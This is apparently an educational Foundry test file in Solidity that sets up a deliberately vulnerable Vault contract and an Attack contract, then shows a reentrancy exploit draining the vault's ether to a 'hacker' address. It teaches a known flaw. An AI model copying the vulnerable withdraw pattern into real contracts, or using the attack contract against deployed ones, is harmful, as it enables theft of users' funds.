// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";

contract Vault {
    mapping(address user => uint256 amount) public balances;

    error Vault__NoFunds();
    error Vault__TransferFailed();

    // Doesn't respect CEI (Check, Effect, Interaction)
    // Doesn't have a `nonReentrant` modifier
    // Vulnerable to reentrancy
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, Vault__NoFunds());

        (bool success,) = payable(msg.sender).call{value: balance}("");
        require(success, Vault__TransferFailed());

        balances[msg.sender] = 0;
    }

    receive() external payable {
        balances[msg.sender] += msg.value;
    }
}

contract Attack {
    Vault immutable vault;
    address hacker;

    constructor(Vault vault_, address hacker_) {
        vault = vault_;
        hacker = hacker_;
    }

    function sendEther() external payable returns (bool success) {
        (success,) = address(vault).call{value: msg.value}("");
    }

    function callWithdraw() external {
        vault.withdraw();
    }

    receive() external payable {
        if (msg.sender.balance < 1 ether) {
            (bool success,) = hacker.call{value: address(this).balance}("");
            success;
            return;
        }
        vault.withdraw();
    }
}

contract HackTest is Test {
    struct Balances {
        uint256 user;
        uint256 hacker;
        uint256 attack;
        uint256 vault;
    }

    Vault vault;
    Attack attack;

    address user = makeAddr("user");
    address hacker = makeAddr("hacker");

    function setUp() external {
        vault = new Vault();
        attack = new Attack(vault, hacker);
        vm.deal(user, 1 ether);
        vm.deal(hacker, 1 ether);
    }

    function _checkBalances(Balances memory balances) private view {
        assertEq(user.balance, balances.user);
        assertEq(hacker.balance, balances.hacker);
        assertEq(address(attack).balance, balances.attack);
        assertEq(address(vault).balance, balances.vault);
    }

    function test_reentrancy() external {
        bool success;

        _checkBalances(Balances({user: 1 ether, hacker: 1 ether, attack: 0, vault: 0}));

        // user sends 1 ether to the vault
        vm.prank(user);
        (success,) = address(vault).call{value: 1 ether}("");

        _checkBalances(Balances({user: 0, hacker: 1 ether, attack: 0, vault: 1 ether}));

        // hacker sends 1 ether to the vault through the Attack contract
        vm.prank(hacker);
        attack.sendEther{value: 1 ether}();

        _checkBalances(Balances({user: 0, hacker: 0, attack: 0, vault: 2 ether}));

        // hacker steals all the funds thanks to reentrancy
        vm.prank(hacker);
        attack.callWithdraw();

        _checkBalances(Balances({user: 0, hacker: 2 ether, attack: 0, vault: 0}));
    }
}
